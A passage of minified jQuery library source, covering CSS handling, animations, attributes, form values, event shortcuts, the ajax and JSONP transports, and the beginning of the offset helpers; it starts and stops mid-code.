this}}),Z.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,t){Z.fn[e]=function(e){for(var n,r=[],i=Z(e),o=i.length-1,s=0;o>=s;s++)n=s===o?this:this.clone(!0),Z(i[s])[t](n),X.apply(r,n.get());return this.pushStack(r)}});var We,$e={},Ie=/^margin/,Be=new RegExp("^("+we+")(?!px)[a-z%]+$","i"),_e=function(t){return t.ownerDocument.defaultView.opener?t.ownerDocument.defaultView.getComputedStyle(t,null):e.getComputedStyle(t,null)};!function(){function t(){s.style.cssText="-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;display:block;margin-top:1%;top:1%;border:1px;padding:1px;width:4px;position:absolute",s.innerHTML="",i.appendChild(o);var t=e.getComputedStyle(s,null);n="1%"!==t.top,r="4px"===t.width,i.removeChild(o)}var n,r,i=J.documentElement,o=J.createElement("div"),s=J.createElement("div");s.style&&(s.style.backgroundClip="content-box",s.cloneNode(!0).style.backgroundClip="",Q.clearCloneStyle="content-box"===s.style.backgroundClip,o.style.cssText="border:0;width:0;height:0;top:0;left:-9999px;margin-top:1px;position:absolute",o.appendChild(s),e.getComputedStyle&&Z.extend(Q,{pixelPosition:function(){return t(),n},boxSizingReliable:function(){return null==r&&t(),r},reliableMarginRight:function(){var t,n=s.appendChild(J.createElement("div"));return n.style.cssText=s.style.cssText="-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0",n.style.marginRight=n.style.width="0",s.style.width="1px",i.appendChild(o),t=!parseFloat(e.getComputedStyle(n,null).marginRight),i.removeChild(o),s.removeChild(n),t}}))}(),Z.swap=function(e,t,n,r){var i,o,s={};for(o in t)s[o]=e.style[o],e.style[o]=t[o];i=n.apply(e,r||[]);for(o in t)e.style[o]=s[o];return i};var ze=/^(none|table(?!-c[ea]).+)/,Xe=new RegExp("^("+we+")(.*)$","i"),Ue=new RegExp("^([+-])=("+we+")","i"),Ve={position:"absolute",visibility:"hidden",display:"block"},Ye={letterSpacing:"0",fontWeight:"400"},Ge=["Webkit","O","Moz","ms"];Z.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=w(e,"opacity");return""===n?"1":n}}}},cssNumber:{columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":"cssFloat"},style:function(e,t,n,r){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var i,o,s,a=Z.camelCase(t),u=e.style;return t=Z.cssProps[a]||(Z.cssProps[a]=C(u,a)),s=Z.cssHooks[t]||Z.cssHooks[a],void 0===n?s&&"get"in s&&void 0!==(i=s.get(e,!1,r))?i:u[t]:(o=typeof n,"string"===o&&(i=Ue.exec(n))&&(n=(i[1]+1)*i[2]+parseFloat(Z.css(e,t)),o="number"),null!=n&&n===n&&("number"!==o||Z.cssNumber[a]||(n+="px"),Q.clearCloneStyle||""!==n||0!==t.indexOf("background")||(u[t]="inherit"),s&&"set"in s&&void 0===(n=s.set(e,n,r))||(u[t]=n)),void 0)}},css:function(e,t,n,r){var i,o,s,a=Z.camelCase(t);return t=Z.cssProps[a]||(Z.cssProps[a]=C(e.style,a)),s=Z.cssHooks[t]||Z.cssHooks[a],s&&"get"in s&&(i=s.get(e,!0,n)),void 0===i&&(i=w(e,t,r)),"normal"===i&&t in Ye&&(i=Ye[t]),""===n||n?(o=parseFloat(i),n===!0||Z.isNumeric(o)?o||0:i):i}}),Z.each(["height","width"],function(e,t){Z.cssHooks[t]={get:function(e,n,r){return n?ze.test(Z.css(e,"display"))&&0===e.offsetWidth?Z.swap(e,Ve,function(){return E(e,t,r)}):E(e,t,r):void 0},set:function(e,n,r){var i=r&&_e(e);return N(e,n,r?k(e,t,r,"border-box"===Z.css(e,"boxSizing",!1,i),i):0)}}}),Z.cssHooks.marginRight=T(Q.reliableMarginRight,function(e,t){return t?Z.swap(e,{display:"inline-block"},w,[e,"marginRight"]):void 0}),Z.each({margin:"",padding:"",border:"Width"},function(e,t){Z.cssHooks[e+t]={expand:function(n){for(var r=0,i={},o="string"==typeof n?n.split(" "):[n];4>r;r++)i[e+Te[r]+t]=o[r]||o[r-2]||o[0];return i}},Ie.test(e)||(Z.cssHooks[e+t].set=N)}),Z.fn.extend({css:function(e,t){return me(this,function(e,t,n){var r,i,o={},s=0;if(Z.isArray(t)){for(r=_e(e),i=t.length;i>s;s++)o[t[s]]=Z.css(e,t[s],!1,r);return o}return void 0!==n?Z.style(e,t,n):Z.css(e,t)},e,t,arguments.length>1)},show:function(){return S(this,!0)},hide:function(){return S(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){Ce(this)?Z(this).show():Z(this).hide()})}}),Z.Tween=D,D.prototype={constructor:D,init:function(e,t,n,r,i,o){this.elem=e,this.prop=n,this.easing=i||"swing",this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=o||(Z.cssNumber[n]?"":"px")},cur:function(){var e=D.propHooks[this.prop];return e&&e.get?e.get(this):D.propHooks._default.get(this)},run:function(e){var t,n=D.propHooks[this.prop];return this.options.duration?this.pos=t=Z.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):this.pos=t=e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):D.propHooks._default.set(this),this}},D.prototype.init.prototype=D.prototype,D.propHooks={_default:{get:function(e){var t;return null==e.elem[e.prop]||e.elem.style&&null!=e.elem.style[e.prop]?(t=Z.css(e.elem,e.prop,""),t&&"auto"!==t?t:0):e.elem[e.prop]},set:function(e){Z.fx.step[e.prop]?Z.fx.step[e.prop](e):e.elem.style&&(null!=e.elem.style[Z.cssProps[e.prop]]||Z.cssHooks[e.prop])?Z.style(e.elem,e.prop,e.now+e.unit):e.elem[e.prop]=e.now}}},D.propHooks.scrollTop=D.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},Z.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2}},Z.fx=D.prototype.init,Z.fx.step={};var Qe,Je,Ke=/^(?:toggle|show|hide)$/,Ze=new RegExp("^(?:([+-])=|)("+we+")([a-z%]*)$","i"),et=/queueHooks$/,tt=[q],nt={"*":[function(e,t){var n=this.createTween(e,t),r=n.cur(),i=Ze.exec(t),o=i&&i[3]||(Z.cssNumber[e]?"":"px"),s=(Z.cssNumber[e]||"px"!==o&&+r)&&Ze.exec(Z.css(n.elem,e)),a=1,u=20;if(s&&s[3]!==o){o=o||s[3],i=i||[],s=+r||1;do a=a||".5",s/=a,Z.style(n.elem,e,s+o);while(a!==(a=n.cur()/r)&&1!==a&&--u)}return i&&(s=n.start=+s||+r||0,n.unit=o,n.end=i[1]?s+(i[1]+1)*i[2]:+i[2]),n}]};Z.Animation=Z.extend(O,{tweener:function(e,t){Z.isFunction(e)?(t=e,e=["*"]):e=e.split(" ");for(var n,r=0,i=e.length;i>r;r++)n=e[r],nt[n]=nt[n]||[],nt[n].unshift(t)},prefilter:function(e,t){t?tt.unshift(e):tt.push(e)}}),Z.speed=function(e,t,n){var r=e&&"object"==typeof e?Z.extend({},e):{complete:n||!n&&t||Z.isFunction(e)&&e,duration:e,easing:n&&t||t&&!Z.isFunction(t)&&t};return r.duration=Z.fx.off?0:"number"==typeof r.duration?r.duration:r.duration in Z.fx.speeds?Z.fx.speeds[r.duration]:Z.fx.speeds._default,(null==r.queue||r.queue===!0)&&(r.queue="fx"),r.old=r.complete,r.complete=function(){Z.isFunction(r.old)&&r.old.call(this),r.queue&&Z.dequeue(this,r.queue)},r},Z.fn.extend({fadeTo:function(e,t,n,r){return this.filter(Ce).css("opacity",0).show().end().animate({opacity:t},e,n,r)},animate:function(e,t,n,r){var i=Z.isEmptyObject(e),o=Z.speed(t,n,r),s=function(){var t=O(this,Z.extend({},e),o);(i||ve.get(this,"finish"))&&t.stop(!0)};return s.finish=s,i||o.queue===!1?this.each(s):this.queue(o.queue,s)},stop:function(e,t,n){var r=function(e){var t=e.stop;delete e.stop,t(n)};return"string"!=typeof e&&(n=t,t=e,e=void 0),t&&e!==!1&&this.queue(e||"fx",[]),this.each(function(){var t=!0,i=null!=e&&e+"queueHooks",o=Z.timers,s=ve.get(this);if(i)s[i]&&s[i].stop&&r(s[i]);else for(i in s)s[i]&&s[i].stop&&et.test(i)&&r(s[i]);for(i=o.length;i--;)o[i].elem!==this||null!=e&&o[i].queue!==e||(o[i].anim.stop(n),t=!1,o.splice(i,1));(t||!n)&&Z.dequeue(this,e)})},finish:function(e){return e!==!1&&(e=e||"fx"),this.each(function(){var t,n=ve.get(this),r=n[e+"queue"],i=n[e+"queueHooks"],o=Z.timers,s=r?r.length:0;for(n.finish=!0,Z.queue(this,e,[]),
i&&i.stop&&i.stop.call(this,!0),t=o.length;t--;)o[t].elem===this&&o[t].queue===e&&(o[t].anim.stop(!0),o.splice(t,1));for(t=0;s>t;t++)r[t]&&r[t].finish&&r[t].finish.call(this);delete n.finish})}}),Z.each(["toggle","show","hide"],function(e,t){var n=Z.fn[t];Z.fn[t]=function(e,r,i){return null==e||"boolean"==typeof e?n.apply(this,arguments):this.animate(A(t,!0),e,r,i)}}),Z.each({slideDown:A("show"),slideUp:A("hide"),slideToggle:A("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,t){Z.fn[e]=function(e,n,r){return this.animate(t,e,n,r)}}),Z.timers=[],Z.fx.tick=function(){var e,t=0,n=Z.timers;for(Qe=Z.now();t<n.length;t++)e=n[t],e()||n[t]!==e||n.splice(t--,1);n.length||Z.fx.stop(),Qe=void 0},Z.fx.timer=function(e){Z.timers.push(e),e()?Z.fx.start():Z.timers.pop()},Z.fx.interval=13,Z.fx.start=function(){Je||(Je=setInterval(Z.fx.tick,Z.fx.interval))},Z.fx.stop=function(){clearInterval(Je),Je=null},Z.fx.speeds={slow:600,fast:200,_default:400},Z.fn.delay=function(e,t){return e=Z.fx?Z.fx.speeds[e]||e:e,t=t||"fx",this.queue(t,function(t,n){var r=setTimeout(t,e);n.stop=function(){clearTimeout(r)}})},function(){var e=J.createElement("input"),t=J.createElement("select"),n=t.appendChild(J.createElement("option"));e.type="checkbox",Q.checkOn=""!==e.value,Q.optSelected=n.selected,t.disabled=!0,Q.optDisabled=!n.disabled,e=J.createElement("input"),e.value="t",e.type="radio",Q.radioValue="t"===e.value}();var rt,it,ot=Z.expr.attrHandle;Z.fn.extend({attr:function(e,t){return me(this,Z.attr,e,t,arguments.length>1)},removeAttr:function(e){return this.each(function(){Z.removeAttr(this,e)})}}),Z.extend({attr:function(e,t,n){var r,i,o=e.nodeType;if(e&&3!==o&&8!==o&&2!==o)return typeof e.getAttribute===ke?Z.prop(e,t,n):(1===o&&Z.isXMLDoc(e)||(t=t.toLowerCase(),r=Z.attrHooks[t]||(Z.expr.match.bool.test(t)?it:rt)),void 0===n?r&&"get"in r&&null!==(i=r.get(e,t))?i:(i=Z.find.attr(e,t),null==i?void 0:i):null!==n?r&&"set"in r&&void 0!==(i=r.set(e,n,t))?i:(e.setAttribute(t,n+""),n):void Z.removeAttr(e,t))},removeAttr:function(e,t){var n,r,i=0,o=t&&t.match(de);if(o&&1===e.nodeType)for(;n=o[i++];)r=Z.propFix[n]||n,Z.expr.match.bool.test(n)&&(e[r]=!1),e.removeAttribute(n)},attrHooks:{type:{set:function(e,t){if(!Q.radioValue&&"radio"===t&&Z.nodeName(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}}}),it={set:function(e,t,n){return t===!1?Z.removeAttr(e,n):e.setAttribute(n,n),n}},Z.each(Z.expr.match.bool.source.match(/\w+/g),function(e,t){var n=ot[t]||Z.find.attr;ot[t]=function(e,t,r){var i,o;return r||(o=ot[t],ot[t]=i,i=null!=n(e,t,r)?t.toLowerCase():null,ot[t]=o),i}});var st=/^(?:input|select|textarea|button)$/i;Z.fn.extend({prop:function(e,t){return me(this,Z.prop,e,t,arguments.length>1)},removeProp:function(e){return this.each(function(){delete this[Z.propFix[e]||e]})}}),Z.extend({propFix:{"for":"htmlFor","class":"className"},prop:function(e,t,n){var r,i,o,s=e.nodeType;if(e&&3!==s&&8!==s&&2!==s)return o=1!==s||!Z.isXMLDoc(e),o&&(t=Z.propFix[t]||t,i=Z.propHooks[t]),void 0!==n?i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:e[t]=n:i&&"get"in i&&null!==(r=i.get(e,t))?r:e[t]},propHooks:{tabIndex:{get:function(e){return e.hasAttribute("tabindex")||st.test(e.nodeName)||e.href?e.tabIndex:-1}}}}),Q.optSelected||(Z.propHooks.selected={get:function(e){var t=e.parentNode;return t&&t.parentNode&&t.parentNode.selectedIndex,null}}),Z.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){Z.propFix[this.toLowerCase()]=this});var at=/[\t\r\n\f]/g;Z.fn.extend({addClass:function(e){var t,n,r,i,o,s,a="string"==typeof e&&e,u=0,l=this.length;if(Z.isFunction(e))return this.each(function(t){Z(this).addClass(e.call(this,t,this.className))});if(a)for(t=(e||"").match(de)||[];l>u;u++)if(n=this[u],r=1===n.nodeType&&(n.className?(" "+n.className+" ").replace(at," "):" ")){for(o=0;i=t[o++];)r.indexOf(" "+i+" ")<0&&(r+=i+" ");s=Z.trim(r),n.className!==s&&(n.className=s)}return this},removeClass:function(e){var t,n,r,i,o,s,a=0===arguments.length||"string"==typeof e&&e,u=0,l=this.length;if(Z.isFunction(e))return this.each(function(t){Z(this).removeClass(e.call(this,t,this.className))});if(a)for(t=(e||"").match(de)||[];l>u;u++)if(n=this[u],r=1===n.nodeType&&(n.className?(" "+n.className+" ").replace(at," "):"")){for(o=0;i=t[o++];)for(;r.indexOf(" "+i+" ")>=0;)r=r.replace(" "+i+" "," ");s=e?Z.trim(r):"",n.className!==s&&(n.className=s)}return this},toggleClass:function(e,t){var n=typeof e;return"boolean"==typeof t&&"string"===n?t?this.addClass(e):this.removeClass(e):Z.isFunction(e)?this.each(function(n){Z(this).toggleClass(e.call(this,n,this.className,t),t)}):this.each(function(){if("string"===n)for(var t,r=0,i=Z(this),o=e.match(de)||[];t=o[r++];)i.hasClass(t)?i.removeClass(t):i.addClass(t);else(n===ke||"boolean"===n)&&(this.className&&ve.set(this,"__className__",this.className),this.className=this.className||e===!1?"":ve.get(this,"__className__")||"")})},hasClass:function(e){for(var t=" "+e+" ",n=0,r=this.length;r>n;n++)if(1===this[n].nodeType&&(" "+this[n].className+" ").replace(at," ").indexOf(t)>=0)return!0;return!1}});var ut=/\r/g;Z.fn.extend({val:function(e){var t,n,r,i=this[0];{if(arguments.length)return r=Z.isFunction(e),this.each(function(n){var i;1===this.nodeType&&(i=r?e.call(this,n,Z(this).val()):e,null==i?i="":"number"==typeof i?i+="":Z.isArray(i)&&(i=Z.map(i,function(e){return null==e?"":e+""})),t=Z.valHooks[this.type]||Z.valHooks[this.nodeName.toLowerCase()],t&&"set"in t&&void 0!==t.set(this,i,"value")||(this.value=i))});if(i)return t=Z.valHooks[i.type]||Z.valHooks[i.nodeName.toLowerCase()],t&&"get"in t&&void 0!==(n=t.get(i,"value"))?n:(n=i.value,"string"==typeof n?n.replace(ut,""):null==n?"":n)}}}),Z.extend({valHooks:{option:{get:function(e){var t=Z.find.attr(e,"value");return null!=t?t:Z.trim(Z.text(e))}},select:{get:function(e){for(var t,n,r=e.options,i=e.selectedIndex,o="select-one"===e.type||0>i,s=o?null:[],a=o?i+1:r.length,u=0>i?a:o?i:0;a>u;u++)if(n=r[u],(n.selected||u===i)&&(Q.optDisabled?!n.disabled:null===n.getAttribute("disabled"))&&(!n.parentNode.disabled||!Z.nodeName(n.parentNode,"optgroup"))){if(t=Z(n).val(),o)return t;s.push(t)}return s},set:function(e,t){for(var n,r,i=e.options,o=Z.makeArray(t),s=i.length;s--;)r=i[s],(r.selected=Z.inArray(r.value,o)>=0)&&(n=!0);return n||(e.selectedIndex=-1),o}}}}),Z.each(["radio","checkbox"],function(){Z.valHooks[this]={set:function(e,t){return Z.isArray(t)?e.checked=Z.inArray(Z(e).val(),t)>=0:void 0}},Q.checkOn||(Z.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})}),Z.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(e,t){Z.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),Z.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)},bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)}});var lt=Z.now(),ct=/\?/;Z.parseJSON=function(e){return JSON.parse(e+"")},Z.parseXML=function(e){var t,n;if(!e||"string"!=typeof e)return null;try{n=new DOMParser,t=n.parseFromString(e,"text/xml")}catch(r){t=void 0}return(!t||t.getElementsByTagName("parsererror").length)&&Z.error("Invalid XML: "+e),t};var ft=/#.*$/,pt=/([?&])_=[^&]*/,dt=/^(.*?):[ \t]*([^\r\n]*)$/gm,ht=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,gt=/^(?:GET|HEAD)$/,mt=/^\/\//,vt=/^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,yt={},xt={},bt="*/".concat("*"),wt=e.location.href,Tt=vt.exec(wt.toLowerCase())||[];Z.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:wt,type:"GET",isLocal:ht.test(Tt[1]),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":bt,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":Z.parseJSON,"text xml":Z.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?R(R(e,Z.ajaxSettings),t):R(Z.ajaxSettings,e)},ajaxPrefilter:F(yt),ajaxTransport:F(xt),ajax:function(e,t){function n(e,t,n,s){var u,c,v,y,b,T=t;2!==x&&(x=2,a&&clearTimeout(a),r=void 0,o=s||"",w.readyState=e>0?4:0,u=e>=200&&300>e||304===e,n&&(y=M(f,w,n)),y=W(f,y,w,u),u?(f.ifModified&&(b=w.getResponseHeader("Last-Modified"),b&&(Z.lastModified[i]=b),b=w.getResponseHeader("etag"),b&&(Z.etag[i]=b)),204===e||"HEAD"===f.type?T="nocontent":304===e?T="notmodified":(T=y.state,c=y.data,v=y.error,u=!v)):(v=T,(e||!T)&&(T="error",0>e&&(e=0))),w.status=e,w.statusText=(t||T)+"",u?h.resolveWith(p,[c,T,w]):h.rejectWith(p,[w,T,v]),w.statusCode(m),m=void 0,l&&d.trigger(u?"ajaxSuccess":"ajaxError",[w,f,u?c:v]),g.fireWith(p,[w,T]),l&&(d.trigger("ajaxComplete",[w,f]),--Z.active||Z.event.trigger("ajaxStop")))}"object"==typeof e&&(t=e,e=void 0),t=t||{};var r,i,o,s,a,u,l,c,f=Z.ajaxSetup({},t),p=f.context||f,d=f.context&&(p.nodeType||p.jquery)?Z(p):Z.event,h=Z.Deferred(),g=Z.Callbacks("once memory"),m=f.statusCode||{},v={},y={},x=0,b="canceled",w={readyState:0,getResponseHeader:function(e){var t;if(2===x){if(!s)for(s={};t=dt.exec(o);)s[t[1].toLowerCase()]=t[2];t=s[e.toLowerCase()]}return null==t?null:t},getAllResponseHeaders:function(){return 2===x?o:null},setRequestHeader:function(e,t){var n=e.toLowerCase();return x||(e=y[n]=y[n]||e,v[e]=t),this},overrideMimeType:function(e){return x||(f.mimeType=e),this},statusCode:function(e){var t;if(e)if(2>x)for(t in e)m[t]=[m[t],e[t]];else w.always(e[w.status]);return this},abort:function(e){var t=e||b;return r&&r.abort(t),n(0,t),this}};if(h.promise(w).complete=g.add,w.success=w.done,w.error=w.fail,f.url=((e||f.url||wt)+"").replace(ft,"").replace(mt,Tt[1]+"//"),f.type=t.method||t.type||f.method||f.type,f.dataTypes=Z.trim(f.dataType||"*").toLowerCase().match(de)||[""],null==f.crossDomain&&(u=vt.exec(f.url.toLowerCase()),f.crossDomain=!(!u||u[1]===Tt[1]&&u[2]===Tt[2]&&(u[3]||("http:"===u[1]?"80":"443"))===(Tt[3]||("http:"===Tt[1]?"80":"443")))),f.data&&f.processData&&"string"!=typeof f.data&&(f.data=Z.param(f.data,f.traditional)),P(yt,f,t,w),2===x)return w;l=Z.event&&f.global,l&&0===Z.active++&&Z.event.trigger("ajaxStart"),f.type=f.type.toUpperCase(),f.hasContent=!gt.test(f.type),i=f.url,f.hasContent||(f.data&&(i=f.url+=(ct.test(i)?"&":"?")+f.data,delete f.data),f.cache===!1&&(f.url=pt.test(i)?i.replace(pt,"$1_="+lt++):i+(ct.test(i)?"&":"?")+"_="+lt++)),f.ifModified&&(Z.lastModified[i]&&w.setRequestHeader("If-Modified-Since",Z.lastModified[i]),Z.etag[i]&&w.setRequestHeader("If-None-Match",Z.etag[i])),(f.data&&f.hasContent&&f.contentType!==!1||t.contentType)&&w.setRequestHeader("Content-Type",f.contentType),w.setRequestHeader("Accept",f.dataTypes[0]&&f.accepts[f.dataTypes[0]]?f.accepts[f.dataTypes[0]]+("*"!==f.dataTypes[0]?", "+bt+"; q=0.01":""):f.accepts["*"]);for(c in f.headers)w.setRequestHeader(c,f.headers[c]);if(f.beforeSend&&(f.beforeSend.call(p,w,f)===!1||2===x))return w.abort();b="abort";for(c in{success:1,error:1,complete:1})w[c](f[c]);if(r=P(xt,f,t,w)){w.readyState=1,l&&d.trigger("ajaxSend",[w,f]),f.async&&f.timeout>0&&(a=setTimeout(function(){w.abort("timeout")},f.timeout));try{x=1,r.send(v,n)}catch(T){if(!(2>x))throw T;n(-1,T)}}else n(-1,"No Transport");return w},getJSON:function(e,t,n){return Z.get(e,t,n,"json")},getScript:function(e,t){return Z.get(e,void 0,t,"script")}}),Z.each(["get","post"],function(e,t){Z[t]=function(e,n,r,i){return Z.isFunction(n)&&(i=i||r,r=n,n=void 0),Z.ajax({url:e,type:t,dataType:i,data:n,success:r})}}),Z._evalUrl=function(e){return Z.ajax({url:e,type:"GET",dataType:"script",async:!1,global:!1,"throws":!0})},Z.fn.extend({wrapAll:function(e){var t;return Z.isFunction(e)?this.each(function(t){Z(this).wrapAll(e.call(this,t))}):(this[0]&&(t=Z(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){for(var e=this;e.firstElementChild;)e=e.firstElementChild;return e}).append(this)),this)},wrapInner:function(e){return Z.isFunction(e)?this.each(function(t){Z(this).wrapInner(e.call(this,t))}):this.each(function(){var t=Z(this),n=t.contents();n.length?n.wrapAll(e):t.append(e)})},wrap:function(e){var t=Z.isFunction(e);return this.each(function(n){Z(this).wrapAll(t?e.call(this,n):e)})},unwrap:function(){return this.parent().each(function(){Z.nodeName(this,"body")||Z(this).replaceWith(this.childNodes)}).end()}}),Z.expr.filters.hidden=function(e){return e.offsetWidth<=0&&e.offsetHeight<=0},Z.expr.filters.visible=function(e){return!Z.expr.filters.hidden(e)};var Ct=/%20/g,Nt=/\[\]$/,kt=/\r?\n/g,Et=/^(?:submit|button|image|reset|file)$/i,St=/^(?:input|select|textarea|keygen)/i;Z.param=function(e,t){var n,r=[],i=function(e,t){t=Z.isFunction(t)?t():null==t?"":t,r[r.length]=encodeURIComponent(e)+"="+encodeURIComponent(t)};if(void 0===t&&(t=Z.ajaxSettings&&Z.ajaxSettings.traditional),Z.isArray(e)||e.jquery&&!Z.isPlainObject(e))Z.each(e,function(){i(this.name,this.value)});else for(n in e)$(n,e[n],t,i);return r.join("&").replace(Ct,"+")},Z.fn.extend({serialize:function(){return Z.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=Z.prop(this,"elements");return e?Z.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!Z(this).is(":disabled")&&St.test(this.nodeName)&&!Et.test(e)&&(this.checked||!Ne.test(e))}).map(function(e,t){var n=Z(this).val();return null==n?null:Z.isArray(n)?Z.map(n,function(e){return{name:t.name,value:e.replace(kt,"\r\n")}}):{name:t.name,value:n.replace(kt,"\r\n")}}).get()}}),Z.ajaxSettings.xhr=function(){try{return new XMLHttpRequest}catch(e){}};var Dt=0,jt={},At={0:200,1223:204},Lt=Z.ajaxSettings.xhr();e.attachEvent&&e.attachEvent("onunload",function(){for(var e in jt)jt[e]()}),Q.cors=!!Lt&&"withCredentials"in Lt,Q.ajax=Lt=!!Lt,Z.ajaxTransport(function(e){var t;return Q.cors||Lt&&!e.crossDomain?{send:function(n,r){var i,o=e.xhr(),s=++Dt;if(o.open(e.type,e.url,e.async,e.username,e.password),e.xhrFields)for(i in e.xhrFields)o[i]=e.xhrFields[i];e.mimeType&&o.overrideMimeType&&o.overrideMimeType(e.mimeType),e.crossDomain||n["X-Requested-With"]||(n["X-Requested-With"]="XMLHttpRequest");for(i in n)o.setRequestHeader(i,n[i]);t=function(e){return function(){t&&(delete jt[s],t=o.onload=o.onerror=null,"abort"===e?o.abort():"error"===e?r(o.status,o.statusText):r(At[o.status]||o.status,o.statusText,"string"==typeof o.responseText?{text:o.responseText}:void 0,o.getAllResponseHeaders()))}},o.onload=t(),o.onerror=t("error"),t=jt[s]=t("abort");try{o.send(e.hasContent&&e.data||null)}catch(a){if(t)throw a}},abort:function(){t&&t()}}:void 0}),Z.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/(?:java|ecma)script/},converters:{"text script":function(e){return Z.globalEval(e),e}}}),Z.ajaxPrefilter("script",function(e){void 0===e.cache&&(e.cache=!1),e.crossDomain&&(e.type="GET")}),Z.ajaxTransport("script",function(e){if(e.crossDomain){var t,n;return{send:function(r,i){t=Z("<script>").prop({async:!0,charset:e.scriptCharset,src:e.url}).on("load error",n=function(e){t.remove(),n=null,e&&i("error"===e.type?404:200,e.type)}),J.head.appendChild(t[0])},abort:function(){n&&n()}}}});var qt=[],Ht=/(=)\?(?=&|$)|\?\?/;Z.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var e=qt.pop()||Z.expando+"_"+lt++;return this[e]=!0,e}}),Z.ajaxPrefilter("json jsonp",function(t,n,r){var i,o,s,a=t.jsonp!==!1&&(Ht.test(t.url)?"url":"string"==typeof t.data&&!(t.contentType||"").indexOf("application/x-www-form-urlencoded")&&Ht.test(t.data)&&"data");return a||"jsonp"===t.dataTypes[0]?(i=t.jsonpCallback=Z.isFunction(t.jsonpCallback)?t.jsonpCallback():t.jsonpCallback,a?t[a]=t[a].replace(Ht,"$1"+i):t.jsonp!==!1&&(t.url+=(ct.test(t.url)?"&":"?")+t.jsonp+"="+i),t.converters["script json"]=function(){return s||Z.error(i+" was not called"),s[0]},t.dataTypes[0]="json",o=e[i],e[i]=function(){s=arguments},r.always(function(){e[i]=o,t[i]&&(t.jsonpCallback=n.jsonpCallback,qt.push(i)),s&&Z.isFunction(o)&&o(s[0]),s=o=void 0}),"script"):void 0}),Z.parseHTML=function(e,t,n){if(!e||"string"!=typeof e)return null;"boolean"==typeof t&&(n=t,t=!1),t=t||J;var r=se.exec(e),i=!n&&[];return r?[t.createElement(r[1])]:(r=Z.buildFragment([e],t,i),i&&i.length&&Z(i).remove(),Z.merge([],r.childNodes))};var Ot=Z.fn.load;Z.fn.load=function(e,t,n){if("string"!=typeof e&&Ot)return Ot.apply(this,arguments);var r,i,o,s=this,a=e.indexOf(" ");return a>=0&&(r=Z.trim(e.slice(a)),e=e.slice(0,a)),Z.isFunction(t)?(n=t,t=void 0):t&&"object"==typeof t&&(i="POST"),s.length>0&&Z.ajax({url:e,type:i,dataType:"html",data:t}).done(function(e){o=arguments,s.html(r?Z("<div>").append(Z.parseHTML(e)).find(r):e)}).complete(n&&function(e,t){s.each(n,o||[e.responseText,t,e])}),this},Z.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){Z.fn[t]=function(e){return this.on(t,e)}}),Z.expr.filters.animated=function(e){return Z.grep(Z.timers,function(t){return e===t.elem}).length};var Ft=e.document.documentElement;Z.offset={setOffset:function(e,t,n){var r,i,o,s,a,u,l,c=Z.css(e,"position"),f=Z(e),p={};"static"===c&&(e.style.position="relative"),a=f.offset(),o=Z.css(e,"top"),u=Z.css(e,"left"),l=("absolute"===c||"fixed"===c)&&(o+u).indexOf("auto")>-1,l?(r=f.position(),s=r.top,i=r.left):(s=parseFloat(o)||0,i=parseFloat(u)||0),Z.isFunction(t)&&(t=t.call(e,n,a)),null!=t.top&&(p.top=t.top-a.top+s),null!=t.left&&(p.left=t.left-a.left+i),"using"in t?t.using.call(e,p):f.css(p)}},Z.fn.extend({offset:function(e){if(arguments.length)return void 0===e?this:this.each(function(t){Z.offset.setOffset(this,e,t)});var t,n,r=this[0],i={top:0,left:0},o=r&&r.ownerDocument;if(o)return t=o.documentElement,Z.contains(t,r)?(typeof 